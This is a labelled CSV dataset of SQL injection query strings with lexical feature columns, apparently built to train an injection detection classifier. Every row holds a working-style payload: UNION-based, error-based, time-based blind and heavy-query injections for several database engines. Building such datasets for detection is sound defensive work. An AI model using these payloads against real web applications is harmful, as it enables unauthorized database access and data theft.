Query,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',1,63,14,4,0,14,0,0,13,2,2,2,0,0,5,16,0,0
"iif  (  1378  =  6569,1,1/0  )  ",1,32,6,0,0,6,0,0,6,0,0,1,0,0,3,11,0,0
"1,  (  select   (  case when   (  5726  =  5275  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,101,22,0,0,11,0,0,22,0,0,1,0,0,31,12,0,2
"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""blkt"" like ""blkt",1,309,54,0,4,39,0,0,53,0,2,2,0,0,112,35,1,4
"-2605%'   )    )     )   union all select 4738,4738#",1,52,8,1,0,8,0,0,7,1,0,1,0,0,14,12,0,1
"1%""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,1,73,14,2,4,17,0,0,13,2,1,0,0,0,15,4,0,0
"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'gydh'  =  'gydh",1,184,30,4,0,26,0,0,29,0,2,0,0,1,44,39,0,1
"1' union all select null,null,null,null,null,null,null--",1,56,5,1,0,9,1,0,4,0,0,2,7,0,42,1,7,1
5739-5738,1,9,1,0,0,1,0,0,0,0,0,1,0,0,0,8,0,0
"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",1,63,8,1,0,11,1,0,7,1,0,3,0,0,14,20,0,1
select   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  select 7033 from information_schema.character_sets  )   end  )  #,1,136,22,0,0,12,0,0,21,0,0,1,0,0,65,20,1,2
"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""qzzg"" like ""qzzg",1,193,35,0,4,25,0,0,34,0,2,1,0,1,59,32,0,3
"1%"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,67,14,0,1,10,1,0,13,1,1,2,0,0,20,10,0,1
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1,149,23,1,0,18,0,0,23,0,0,0,0,1,49,24,0,0
"-4044%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  ",1,255,51,0,1,42,0,0,51,1,8,1,0,0,79,36,7,1
"1""   )    )    as nejd where 2885  =  2885",1,42,9,0,1,4,0,0,8,0,0,0,0,0,11,9,0,0
-2745   )    )    as aywp where 9735  =  9735 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,160,31,4,0,20,1,0,30,0,3,3,0,0,63,26,0,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847",1,94,15,0,0,9,0,0,14,0,1,0,0,1,23,23,0,1
"-1844""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""abdw"" like ""abdw",1,102,18,0,4,16,0,0,17,0,2,1,0,0,24,16,0,0
"-8651""  )   where 8391  =  8391 union all select 8391,8391#",1,59,10,0,1,6,0,0,9,0,0,1,0,0,19,20,0,1
-4562'  )   or 3038  =  3038,1,28,6,1,0,4,0,0,5,0,1,1,0,0,2,12,0,0
"1""  )   where 7840  =  7840 union all select null,null#",1,55,10,0,1,5,0,0,9,0,0,0,2,0,27,9,2,1
"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",1,92,16,4,0,14,0,0,15,0,2,1,0,0,24,16,0,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",1,129,20,0,3,14,0,0,19,0,1,1,0,0,84,4,0,2
"1' and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,52,11,1,0,7,0,0,11,0,1,0,0,0,11,10,0,0
"-9037%"" union all select 6583#",1,30,5,0,1,4,0,0,4,1,0,1,0,0,14,8,0,1
"1"" where 7022  =  7022",1,22,5,0,1,2,0,0,4,0,0,0,0,0,5,9,0,0
"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#",1,81,8,1,0,13,0,0,7,0,0,1,0,0,14,36,0,1
1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   -- jduw,1,98,21,0,0,9,1,0,20,0,0,2,0,1,35,13,0,1
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'fsvr'  =  'fsvr",1,355,71,4,0,54,0,0,70,0,6,0,2,0,115,35,9,1
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,51,11,0,0,6,0,0,11,0,1,0,0,0,11,10,0,0
select case when 2948  =  7279 then 1 else null end--,1,53,11,0,0,3,1,0,10,0,0,2,1,0,29,9,1,1
"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --",1,76,16,1,0,10,1,0,15,0,1,3,0,0,16,24,0,0
"1%' union all select null,null,null--",1,37,5,1,0,6,1,0,4,1,0,2,3,0,26,1,3,1
"1%""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,1,301,54,0,4,42,0,0,53,2,2,2,0,0,99,35,1,4
"-8133'  )   union all select 6417,6417,6417,6417,6417,6417,6417,6417--",1,70,6,1,0,12,1,0,5,0,0,3,0,0,14,36,0,1
"-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#",1,94,14,3,0,12,0,0,13,0,1,1,0,0,37,28,0,2
"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,161,29,0,0,17,1,0,28,0,1,3,0,0,82,17,0,2
"1   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   4048  =  4048",1,169,29,0,0,18,0,0,28,0,2,1,0,0,75,17,0,2
"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,142,25,0,1,16,1,0,24,0,1,3,0,0,69,16,0,2
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",1,160,27,4,0,20,0,0,26,0,2,1,0,0,75,8,0,2
"1%""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""%""  =  """,1,189,32,0,4,30,0,0,31,2,2,0,0,1,37,39,0,1
"1""   )    )    as rign where 1604  =  1604 and 3661  =  3054--",1,62,13,0,1,7,1,0,12,0,1,2,0,0,14,17,0,0
"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",1,97,19,4,0,15,0,0,18,0,2,0,0,0,22,10,0,0
-6813   )    )     )   or 6872  =  6872 and    (    (     (  7304  =  7304,1,74,15,0,0,9,0,0,14,0,2,1,0,0,5,20,0,0
-1876%'  )   union all select 6463--,1,36,6,1,0,6,1,0,5,1,0,3,0,0,14,8,0,1
-1908'   )    )     )   union all select 7665#,1,46,8,1,0,6,0,0,7,0,0,1,0,0,14,8,0,1
"1  )   as wvpl where 9791  =  9791 and make_set  (  3491  =  9067,9067  )  --",1,77,16,0,0,9,1,0,15,0,1,2,0,0,21,21,0,0
1%'   )    )    and 7533  =  7533 and    (    (   '%'  =  ',1,59,13,4,0,12,0,0,12,2,2,0,0,0,6,9,0,0
"-9858"" or 8592  =  8553",1,23,5,0,1,3,0,0,4,0,1,1,0,0,2,12,0,0
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # yoch,1,334,74,0,0,46,0,0,73,0,1,10,0,0,82,47,12,1
-3862'  )   or 9323  =  9323#,1,29,6,1,0,5,0,0,5,0,1,1,0,0,2,12,0,0
1   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  3505  =  3505,1,384,82,0,0,63,0,0,81,0,12,0,0,0,78,53,10,1
"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # utdm",1,239,49,0,0,40,0,0,48,0,6,0,2,0,75,29,9,0
"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cylu'  =  'cylu",1,229,45,4,0,38,0,0,44,0,5,0,1,0,63,24,6,0
"1  )   as tjwa where 1173  =  1173 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,173,29,0,0,20,1,0,28,0,1,2,0,1,47,43,0,1
"-2028%'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end  ",1,255,54,1,0,34,0,0,54,1,1,6,0,0,71,35,7,2
"1""   )    )    as jrld where 3488  =  3488",1,42,9,0,1,4,0,0,8,0,0,0,0,0,11,9,0,0
"1""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,134,23,0,1,17,1,0,22,0,1,3,0,0,64,8,0,2
"-6659'  )   where 1256  =  1256 union all select 1256,1256--",1,60,10,1,0,7,1,0,9,0,0,3,0,0,19,20,0,1
"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",1,75,8,0,0,11,0,0,7,0,0,1,0,0,14,32,0,1
"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,92,19,3,0,14,0,0,18,0,2,0,0,0,25,18,0,1
"-2667  )   union all select 5848,5848,5848,5848--",1,49,6,0,0,7,1,0,5,0,0,3,0,0,14,20,0,1
1'||  (  select 'allj' where 7334  =  7334,1,42,8,3,0,7,0,0,7,0,1,0,0,0,15,9,0,1
"1"" and elt  (  4249  =  4249,7259  )   and ""kgtz"" like ""kgtz",1,60,12,0,4,8,0,0,11,0,2,0,0,0,21,13,0,0
"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",1,67,15,4,0,13,0,0,14,2,2,0,0,0,14,10,0,0
"1%'   )    )     )   union all select null,null,null,null,null,null--",1,69,8,1,0,12,1,0,7,1,0,2,6,0,38,1,6,1
-5694   )    )    as cxnb where 6858  =  6858 or 9323  =  9323#,1,63,13,0,0,6,0,0,12,0,1,1,0,0,13,20,0,0
"-5597'  )   or make_set  (  2490  =  2164,2164  )  ",1,51,9,1,0,8,0,0,9,0,1,1,0,0,9,16,0,0
1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,1,76,14,3,0,9,1,0,13,0,1,2,1,0,41,9,1,2
1  )   as jdhz where 2021  =  2021,1,34,8,0,0,2,0,0,7,0,0,0,0,0,11,9,0,0
"1%'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,140,28,1,0,28,1,0,27,1,4,2,0,0,36,16,4,0
"1""  )   where 9223  =  9223 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,198,37,0,1,26,1,0,36,0,1,3,0,1,49,40,0,3
"1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'zovb' like 'zovb",1,159,27,6,0,23,0,0,26,0,2,1,0,0,47,15,0,0
"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'zxon' like 'zxon",1,99,18,4,0,15,0,0,17,0,2,0,0,0,25,13,0,0
"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'owga' like 'owga",1,336,60,4,0,46,0,0,59,0,4,0,1,0,122,34,6,1
"1""  )   as wvxt where 7321  =  7321 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,155,32,0,1,26,1,0,31,0,4,2,0,0,48,23,4,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual# gnga",1,127,24,0,0,21,0,0,23,0,3,0,0,0,52,10,4,1
"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",1,144,23,0,0,17,0,0,22,0,1,0,0,1,40,35,0,1
"1 where 3535  =  3535 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,137,24,0,0,14,1,0,23,0,1,3,0,0,70,16,0,2
"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""mezx"" like ""mezx",1,314,60,0,4,34,0,0,59,0,2,2,0,0,114,55,0,7
"1  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,97,18,0,0,13,1,0,17,0,1,3,0,0,32,13,0,2
"-7511   )    )    as xqzf where 9939  =  9939 union all select 9939,9939,9939,9939,9939,9939,9939--",1,99,13,0,0,12,1,0,12,0,0,3,0,0,25,40,0,1
"1' where 8803  =  8803 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,194,32,1,0,16,1,0,31,0,1,3,0,0,113,20,0,2
1'   )    )    as bbdf where 1327  =  1327,1,42,9,1,0,4,0,0,8,0,0,0,0,0,11,9,0,0
"1  )   as nlig where 5964  =  5964 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,101,19,0,0,9,0,0,18,0,1,0,0,1,27,29,0,0
"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""%""  =  """,1,103,23,0,4,18,0,0,22,2,2,1,0,0,30,2,0,2
1   )    )    as kccx where 7547  =  7547 union all select null--,1,65,13,0,0,5,1,0,12,0,0,2,1,0,29,9,1,1
"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '",1,268,48,4,0,36,0,0,47,2,2,2,0,0,100,35,1,4
-7772'   )    )    or 9323  =  9323#,1,36,7,1,0,6,0,0,6,0,1,1,0,0,2,12,0,0
"iif  (  5571  =  4947,1,1/0  )  ",1,32,6,0,0,6,0,0,6,0,0,1,0,0,3,11,0,0
"-6595   )    )     )   union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",1,90,8,0,0,14,0,0,7,0,0,1,0,0,14,44,0,1
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'cbnc' like 'cbnc,1,389,82,4,0,66,0,0,81,0,12,0,0,0,90,45,10,1
"1'  )   as vlwh where 9403  =  9403 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,85,19,1,0,10,0,0,18,0,1,0,0,0,21,18,0,0
"1%""  )   union all select null,null#",1,36,6,0,1,5,0,0,5,1,0,0,2,0,22,1,2,1
"-4462%""  )   or 8571  =  8571--",1,31,6,0,1,7,1,0,5,1,1,3,0,0,2,12,0,0
"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'skdy'  =  'skdy",1,233,45,4,0,38,0,0,44,0,5,0,1,0,64,27,6,0
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,1,133,27,4,0,20,0,0,26,0,2,1,0,0,38,2,0,2
select   (  case when   (  4341  =  7041  )   then 4341 else 4341*  (  select 4341 from mysql.db  )   end  )  #,1,111,22,0,0,10,0,0,21,0,0,1,0,0,42,20,0,2
"-2625'  )   or elt  (  1032  =  1032,3623  )   and   (  'eliy'  =  'eliy",1,72,14,4,0,12,0,0,13,0,2,1,0,0,16,16,0,0
"waitfor delay '0:0:5' and ""lhcv""  =  ""lhcv",1,42,7,2,3,8,0,0,6,0,1,0,0,0,23,3,0,0
"1""  )   where 2278  =  2278",1,27,6,0,1,3,0,0,5,0,0,0,0,0,5,9,0,0
"1   )    )     )   union all select null,null#",1,46,8,0,0,5,0,0,7,0,0,0,2,0,22,1,2,1
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # hlrg",1,133,23,0,0,14,0,0,22,0,1,1,0,0,76,9,0,2
"select * from generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   limit 1--",1,110,20,0,0,11,1,0,19,0,0,3,0,0,48,19,0,1
-2527   )    )    as oqpy where 7468  =  7468 or 3038  =  3038,1,62,13,0,0,5,0,0,12,0,1,1,0,0,13,20,0,0
1%' waitfor delay '0:0:5'--,1,27,4,3,0,8,1,0,3,1,0,2,0,0,12,4,0,0
"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,88,16,1,0,9,0,0,15,0,1,0,0,1,22,27,0,0
"1'+  (  select 'mikf' where 5814  =  5814 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,213,35,3,0,20,1,0,34,0,1,4,0,0,123,20,0,3
"1   )    )    as rsnb where 3168  =  3168 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,184,31,0,0,20,0,0,30,0,0,0,0,1,61,31,0,0
"1"" where 5039  =  5039 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,255,52,0,1,43,1,0,51,0,6,2,2,0,77,35,9,0
1'  )   where 9516  =  9516,1,27,6,1,0,3,0,0,5,0,0,0,0,0,5,9,0,0
"-9871""  )   union all select 9082#",1,34,6,0,1,4,0,0,5,0,0,1,0,0,14,8,0,1
1'||  (  select 'adni' from dual where 6611  =  6611,1,52,10,3,0,7,0,0,9,0,1,0,0,0,23,9,0,1
1   )    )    as wajy where 8593  =  8593,1,41,9,0,0,3,0,0,8,0,0,0,0,0,11,9,0,0
-8404   )    )    order by 1--,1,30,6,0,0,5,1,0,5,0,0,3,0,0,7,5,0,1
"-2759%""   )    )    or 7769  =  1249#",1,37,7,0,1,7,0,0,6,1,1,1,0,0,2,12,0,0
"  (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,107,15,0,0,10,0,0,16,0,0,1,0,0,69,3,0,2
"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",1,98,12,0,0,12,1,0,11,0,0,2,9,0,61,9,9,1
"1' where 1628  =  1628 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,195,32,1,0,16,1,0,31,0,1,3,0,0,114,20,0,2
"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (",1,255,52,0,1,42,0,0,51,0,8,1,0,0,79,36,7,1
1'  )   where 2974  =  2974 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,350,73,1,0,59,1,0,72,0,11,2,0,0,94,53,10,1
1   )    )    as dgso where 4654  =  4654 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,374,81,0,0,61,1,0,80,0,11,2,0,0,86,53,10,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  1321  =  1321",1,98,17,0,0,11,0,0,16,0,1,1,0,0,32,16,0,2
1'  )   as sagj where 4558  =  4558,1,35,8,1,0,3,0,0,7,0,0,0,0,0,11,9,0,0
1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,92,20,1,0,14,0,0,19,1,1,1,0,0,27,2,0,2
"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yxpo"" like ""yxpo",1,195,31,0,4,26,0,0,30,0,2,0,0,1,51,35,0,1
1'+  (  select oljg where 2006  =  2006 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   +',1,442,96,2,0,73,0,0,95,0,14,2,0,0,116,59,13,3
"1%'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  '",1,195,37,4,0,30,0,0,36,2,2,1,0,1,46,32,0,3
"-1993%""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""%""  =  """,1,144,28,4,4,24,0,0,27,2,4,1,0,0,55,18,0,1
"1  )   as ihan where 5298  =  5298 and elt  (  6587  =  3479,3479  )  --",1,72,16,0,0,8,1,0,15,0,1,2,0,0,17,21,0,0
